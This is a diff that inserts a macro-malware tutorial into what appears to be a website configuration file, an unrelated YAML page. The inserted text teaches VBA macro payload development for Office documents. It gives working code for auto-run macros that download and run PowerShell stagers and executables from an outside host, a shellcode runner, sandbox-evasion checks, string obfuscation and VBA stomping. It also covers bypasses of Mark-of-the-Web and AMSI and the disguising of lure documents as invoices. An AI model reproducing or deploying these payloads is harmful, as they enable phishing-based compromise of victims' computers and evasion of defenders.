@@ -40,7 +40,349 @@ round-avatar: true
 # If you want to have an image logo in the top-left corner instead of having the title of the website,
 # then specify the following parameter
 #title-img: /path/to/image
+Master the development of VBA (Visual Basic for Applications) macro payloads for Microsoft Office documents, including auto-execution triggers, sandbox evasion, obfuscation techniques, and VBA stomping to remove source code while preserving executable p-code.
 
+1. VBA Macros as an Attack Vector
+Despite years of mitigation efforts, VBA macros remain one of the most reliable initial access vectors. Microsoft's decision to block macros in documents from the Internet (2022) reduced their effectiveness, but they remain viable in specific scenarios:
+
+Documents delivered via trusted channels (SharePoint, internal email).
+ISO/IMG containers that strip Mark-of-the-Web.
+Older Office versions that don't enforce the block.
+Macro-enabled templates (.dotm) in trusted locations.
+MITRE ATT&CK: T1059.005 (Command and Scripting Interpreter: Visual Basic), T1204.002 (User Execution: Malicious File)
+
+2. VBA Macro Fundamentals
+2.1 Where Macros Live
+VBA code is stored in the vbaProject.bin OLE stream inside Office documents:
+
+Document.docm (ZIP archive)
+  +-- word/vbaProject.bin     (OLE compound file)
+      +-- VBA/
+      |   +-- _VBA_PROJECT    (VBA project info)
+      |   +-- dir             (Compressed directory stream)
+      |   +-- ThisDocument    (Code module - compressed VBA source)
+      |   +-- Module1         (Additional code modules)
+      +-- PROJECT             (Project metadata - text)
+      +-- PROJECTwm           (Project metadata - binary)
+2.2 Auto-Execution Entry Points
+Trigger	When It Fires	Document Type
+AutoOpen()	When the document is opened	Word
+Document_Open()	When the document is opened (event)	Word
+Auto_Open()	When the workbook is opened	Excel
+Workbook_Open()	When the workbook is opened (event)	Excel
+AutoExec()	When Word starts (normal.dotm)	Word
+Document_Close()	When the document is closed	Word
+AutoClose()	When the document is closed	Word
+2.3 Basic Macro Structure
+Sub AutoOpen()
+    ' Executes when the document is opened
+    Dim cmd As String
+    cmd = "powershell -w hidden -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.5/stager.ps1')"
+    Shell cmd, vbHide
+End Sub
+3. Execution Methods
+3.1 Shell Function
+Shell "cmd.exe /c whoami > C:\Temp\output.txt", vbHide
+Limitation: Shell is asynchronous and returns a process ID. It doesn't capture output.
+
+3.2 WScript.Shell (COM)
+Dim wsh As Object
+Set wsh = CreateObject("WScript.Shell")
+wsh.Run "powershell -w hidden -ep bypass -file C:\Temp\stager.ps1", 0, False
+' 0 = hidden window, False = don't wait for completion
+3.3 WMI Process Create
+Dim wmi As Object
+Set wmi = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
+wmi.Create "powershell -w hidden -enc JABYA2x...", Null, Null, pid
+Advantage: WMI-based execution breaks the parent-child relationship. The spawned process's parent is WmiPrvSE.exe, not WINWORD.EXE.
+
+3.4 Scheduled Task
+Dim wsh As Object
+Set wsh = CreateObject("WScript.Shell")
+wsh.Run "schtasks /create /tn UpdateCheck /tr ""powershell -w hidden -c ..."" /sc once /st 00:00 /f", 0, True
+wsh.Run "schtasks /run /tn UpdateCheck", 0, False
+wsh.Run "schtasks /delete /tn UpdateCheck /f", 0, False
+3.5 ShellBrowserWindow (COM)
+Dim obj As Object
+Set obj = GetObject("new:{C08AFD90-F2A1-11D1-8455-00A0C91F3880}")
+obj.Document.Application.ShellExecute "powershell", "-w hidden -c ...", "", "", 0
+This uses the ShellBrowserWindow COM object, which is less commonly monitored.
+
+4. Sandbox Evasion
+4.1 Environment Checks
+Function IsSandbox() As Boolean
+    IsSandbox = False
+
+    ' Check computer name length (sandboxes often use short names)
+    If Len(Environ("COMPUTERNAME")) < 4 Then IsSandbox = True
+
+    ' Check for common sandbox usernames
+    Dim user As String
+    user = LCase(Environ("USERNAME"))
+    If user = "sandbox" Or user = "malware" Or user = "virus" Or _
+       user = "sample" Or user = "admin" Then IsSandbox = True
+
+    ' Check domain membership
+    Dim domain As String
+    domain = Environ("USERDOMAIN")
+    If domain = Environ("COMPUTERNAME") Then IsSandbox = True  ' Not domain-joined
+
+    ' Check physical memory (sandboxes often have < 4GB)
+    Dim mem As Object
+    Set mem = GetObject("winmgmts:\\.\root\cimv2").ExecQuery( _
+        "SELECT TotalPhysicalMemory FROM Win32_ComputerSystem")
+    Dim item As Object
+    For Each item In mem
+        If CLng(item.TotalPhysicalMemory / 1073741824) < 4 Then IsSandbox = True
+    Next
+
+    ' Check processor count
+    If Val(Environ("NUMBER_OF_PROCESSORS")) < 2 Then IsSandbox = True
+
+    ' Check for recent files (sandboxes have no user activity)
+    If Dir(Environ("APPDATA") & "\Microsoft\Windows\Recent\*.*") = "" Then _
+        IsSandbox = True
+End Function
+4.2 Timing Checks
+Sub TimingCheck()
+    Dim start As Double
+    start = Timer
+
+    ' Sleep for 10 seconds using Application.Wait
+    Application.Wait (Now + TimeValue("0:00:10"))
+
+    Dim elapsed As Double
+    elapsed = Timer - start
+
+    ' Sandboxes may fast-forward Wait/Sleep
+    If elapsed < 9 Then
+        ' Likely sandboxed -- exit without executing payload
+        Exit Sub
+    End If
+End Sub
+4.3 User Interaction Check
+Sub Document_Open()
+    ' Only execute after user interacts with the document
+    ' Set a custom property that triggers on form button click
+    MsgBox "This document requires macro content to display properly." & vbCrLf & _
+           "Please click OK to continue.", vbInformation, "Document Viewer"
+    ' If we reach here, a human clicked OK
+    ExecutePayload
+End Sub
+4.4 Document-Specific Checks
+' Check if the document name is what we expect (sandboxes may rename)
+If InStr(1, ActiveDocument.Name, "Invoice", vbTextCompare) = 0 Then Exit Sub
+
+' Check if the document was recently opened from email (check path)
+If InStr(1, ActiveDocument.Path, "Content.Outlook", vbTextCompare) > 0 Then
+    ' Opened from Outlook -- likely legitimate delivery
+    ExecutePayload
+End If
+5. Obfuscation Techniques
+5.1 String Obfuscation
+' Character-by-character construction
+Dim cmd As String
+cmd = Chr(112) & Chr(111) & Chr(119) & Chr(101) & Chr(114) & _
+      Chr(115) & Chr(104) & Chr(101) & Chr(108) & Chr(108)
+' Spells "powershell"
+
+' Split and join
+Dim parts() As String
+parts = Split("po-wer-she-ll", "-")
+cmd = Join(parts, "")
+
+' Environment variable abuse
+cmd = Environ("ComSpec")  ' Returns cmd.exe path
+5.2 Variable Name Obfuscation
+' Use meaningless variable names
+Dim xlRange As Object, wbData As String, fmtCell As Long
+' These look like legitimate Excel operations but hold payload data
+Set xlRange = CreateObject("WScript.Shell")
+wbData = "powershell -w hidden ..."
+fmtCell = 0
+xlRange.Run wbData, fmtCell, False
+5.3 Control Flow Obfuscation
+Sub AutoOpen()
+    Dim x As Integer
+    x = 1
+    If x > 0 Then
+        Call Step1
+    Else
+        ' Dead code -- never executed
+        MsgBox "Normal document"
+    End If
+End Sub
+
+Sub Step1()
+    Dim y As Long
+    y = 42
+    Select Case y
+        Case 42: Call Step2
+        Case Else: Exit Sub  ' Dead path
+    End Select
+End Sub
+
+Sub Step2()
+    ' Actual payload here
+    ' ...
+End Sub
+5.4 Stored in Document Properties
+Hide payload strings in document properties:
+
+' Read command from a custom document property
+Dim cmd As String
+cmd = ActiveDocument.CustomDocumentProperties("Comments").Value
+Shell cmd, vbHide
+Set the property when crafting the document:
+
+ActiveDocument.CustomDocumentProperties.Add "Comments", False, msoPropertyTypeString, _
+    "powershell -w hidden -enc JABYA2x..."
+6. Advanced Payload Techniques
+6.1 Download and Execute
+Sub DownloadAndExec()
+    Dim http As Object
+    Set http = CreateObject("MSXML2.XMLHTTP")
+    http.Open "GET", "http://10.0.0.5/payload.exe", False
+    http.send
+
+    Dim stream As Object
+    Set stream = CreateObject("ADODB.Stream")
+    stream.Type = 1  ' Binary
+    stream.Open
+    stream.Write http.responseBody
+    stream.SaveToFile Environ("TEMP") & "\svchost.exe", 2
+    stream.Close
+
+    Shell Environ("TEMP") & "\svchost.exe", vbHide
+End Sub
+6.2 Shellcode Runner (VBA + Win32 API)
+Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" ( _
+    ByVal lpAddress As LongPtr, ByVal dwSize As Long, _
+    ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
+
+Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" ( _
+    ByVal Destination As LongPtr, ByRef Source As Any, _
+    ByVal Length As Long) As LongPtr
+
+Private Declare PtrSafe Function CreateThread Lib "kernel32" ( _
+    ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, _
+    ByVal lpStartAddress As LongPtr, ByVal lpParameter As LongPtr, _
+    ByVal dwCreationFlags As Long, ByRef lpThreadId As Long) As LongPtr
+
+Sub ShellcodeRunner()
+    Dim buf As Variant
+    buf = Array(252, 72, 131, 228, 240, ...)  ' Shellcode bytes
+
+    Dim addr As LongPtr
+    addr = VirtualAlloc(0, UBound(buf) + 1, &H3000, &H40)
+
+    Dim i As Long
+    For i = 0 To UBound(buf)
+        Dim b As Byte
+        b = buf(i)
+        RtlMoveMemory addr + i, b, 1
+    Next
+
+    Dim tid As Long
+    CreateThread 0, 0, addr, 0, 0, tid
+End Sub
+6.3 Macro-to-DLL Reflection
+Download a .NET DLL and load it reflectively from VBA:
+
+Sub ReflectiveDLL()
+    ' Download DLL
+    Dim http As Object
+    Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    http.Open "GET", "http://10.0.0.5/implant.dll", False
+    http.send
+
+    ' Write to disk and load via rundll32 or reflection
+    ' Alternative: use .NET interop via COM to load assembly in memory
+End Sub
+7. VBA Stomping
+7.1 What Is VBA Stomping?
+VBA macros in Office documents are stored in two forms:
+
+Source code: Compressed VBA source in the module stream.
+P-code: Pre-compiled bytecode in the _VBA_PROJECT stream.
+Office executes the p-code (not the source code) if the VBA version matches. VBA stomping replaces the source code with benign code while preserving the malicious p-code.
+
+Result: Analysts examining the VBA source see innocent code, but execution runs the malicious p-code.
+
+7.2 How It Works
+Normal document:
+  Source code: malicious VBA    -->  P-code: malicious bytecode  [MATCH]
+  Office executes p-code
+
+Stomped document:
+  Source code: benign VBA       -->  P-code: malicious bytecode  [MISMATCH but runs p-code]
+  Analysts see benign source
+  Office executes malicious p-code
+7.3 Limitations
+Version-specific: P-code is compiled for a specific VBA version (e.g., VBA7 in Office 2016). If the target has a different version, Office recompiles from source -- executing the benign code instead.
+Detection: Tools like pcodedmp can disassemble p-code, revealing the mismatch.
+7.4 Implementation
+See vba_stomper.py in the code files. The process:
+
+Open the vbaProject.bin OLE stream.
+Locate the module streams (e.g., ThisDocument, Module1).
+Decompress the source code using the VBA compression algorithm.
+Replace the decompressed source with benign code.
+Recompress using the same algorithm.
+Write back to the module stream, preserving the p-code section.
+8. Macro Security Bypass Techniques
+8.1 Mark-of-the-Web Removal
+Since 2022, Office blocks macros in files with MoTW. Bypass methods:
+
+Deliver inside ISO/IMG containers (MoTW not applied to contents).
+Use 7-zip to extract (historically didn't preserve MoTW -- now patched).
+Deliver via network shares (UNC paths don't get MoTW).
+8.2 Trusted Documents
+Once a user clicks "Enable Content," that document is added to Trusted Documents. If the user opens it again, macros run without prompting.
+
+8.3 Trusted Locations
+Documents in Trusted Locations run macros without any prompt:
+
+%APPDATA%\Microsoft\Templates\        (default trusted)
+Custom paths added by Group Policy
+8.4 Group Policy Override
+If the target organization sets "Disable VBA for Office applications" via GPO, macros are completely blocked. Verify this in reconnaissance.
+
+9. Document Preparation
+9.1 Creating the DOCM
+# Create macro-enabled document
+$word = New-Object -ComObject Word.Application
+$word.Visible = $false
+$doc = $word.Documents.Add()
+
+# Add VBA module
+$vbProject = $doc.VBProject
+$module = $vbProject.VBComponents.Add(1)  # 1 = vbext_ct_StdModule
+$module.CodeModule.AddFromString $vbaCode
+
+# Save as macro-enabled
+$doc.SaveAs("C:\Temp\Invoice.docm", 13)  # 13 = wdFormatXMLDocumentMacroEnabled
+$word.Quit()
+9.2 Metadata Sanitization
+' Remove metadata before distribution
+With ActiveDocument
+    .RemoveDocumentInformation wdRDIAll
+    .BuiltInDocumentProperties("Author").Value = "HR Department"
+    .BuiltInDocumentProperties("Company").Value = "Target Corp"
+End With
+10. OPSEC Considerations
+AMSI integration: Office 365 integrates AMSI, which scans VBA before execution. Use AMSI bypass techniques (memory patching of AmsiScanBuffer) or obfuscate heavily.
+ETW logging: VBA execution generates ETW events. Use COM-based execution to reduce direct VBA artifacts.
+Process tree: WINWORD.EXE -> cmd.exe -> powershell.exe is a well-known malicious pattern. Use WMI or scheduled tasks to break the chain.
+File format: .docm is obviously macro-enabled. Consider .doc (legacy format) or .dotm (template) for less scrutiny.
+Payload staging: Don't embed the full implant in the macro. Download a stager that fetches the main payload -- reduces macro size and VT detection.
+11. Lab Exercise
+Create a DOCM with an AutoOpen macro that executes calc.exe via WMI.
+Add sandbox evasion checks (memory, processor count, username).
+Obfuscate the VBA code using string construction and variable renaming.
+Use vba_stomper.py to replace the source code with benign code.
+Test execution -- verify calc.exe still runs despite benign source.
+Analyze with olevba and pcodedmp to see the stomping effect.
 
 #####################################
 # --- Footer social media links --- #
